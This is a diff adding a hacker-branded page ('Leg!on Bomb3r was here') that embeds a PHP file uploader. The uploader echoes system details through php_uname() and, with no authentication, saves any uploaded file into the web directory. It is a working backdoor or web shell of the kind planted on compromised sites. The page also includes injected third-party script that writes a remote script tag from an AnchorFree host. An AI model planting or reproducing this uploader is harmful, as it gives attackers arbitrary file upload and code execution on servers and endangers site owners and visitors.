@@ -1,0 +1,38 @@
+<html>
+<head>
+
+<title>Leg!on Bomb3r was here</title>
+<meta http-equiv=Content-Type content=text/html; charset=utf-8 charset=UTF-8>
+<style type="text/css">
+
+  body {
+    height:100%;
+    width: 100%;
+    padding: 0;
+    margin: 0;
+    background-image: url('http://i.imgur.com/tA236qQ.jpg');
+    background-repeat: no-repeat;
+    background-color: #000000;
+    color: #FFFFFF;
+    font-family: "Special Elite";
+    font-size: 14pt;
+    text-decoration: none;
+</style>
+<body><script type="text/javascript">ANCHORFREE_VERSION="623161526"</script><script type='text/javascript'>var _AF2$ = {'SN':'HSSHIELD00TN','IP':'69.22.172.11','CH':'HSSCNL000393','CT':'0','HST':'&sessStartTime=0&SFLAG=1&in=1423962910_84044764|d,1553137850|w,1553137850|m,1553137850|t&out=1423962910_23400718|d,305397307|w,305397307|m,305397307|t&NUM_VID=2&NUM_VID_TS=1423962310&bChrome=40&pv=5&clsBtnCnt=14&fav=8&fvidat=0&fvidv=0&accessLP=1','AFH':'hss306','RN':Math.floor(Math.random()*999),'TOP':(parent.location!=document.location||top.location!=document.location)?0:1,'AFVER':'3.69','fbw':false,'FBWCNT':0,'FBWCNTNAME':'FBWCNT_CHROME','NOFBWNAME':'NO_FBW_CHROME','B':'c','VER': 'nonus'};if(_AF2$.TOP==1){document.write("<scr"+"ipt src='http://box.anchorfree.net/insert/insert.php?sn="+_AF2$.SN+"&ch="+_AF2$.CH+"&v="+ANCHORFREE_VERSION+6+"&b="+_AF2$.B+"&ver="+_AF2$.VER+"&afver="+_AF2$.AFVER+"' type='text/javascript'></scr"+"ipt>");}</script>
+</center>
+<p><b>Leg!on<span lang="ar-ma">|</span> Uploader</b></p>
+
+<?php
+echo '<b><br><br>'.php_uname().'<br></b>';
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+ if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded Successfully</b><br><br>'; }
+ else { echo '<b>Upload Failed! </b><br><br>'; }
+}
+?></p>
+</body>
+<!--
+Leg!on Bomb3r
+-->
+</html>
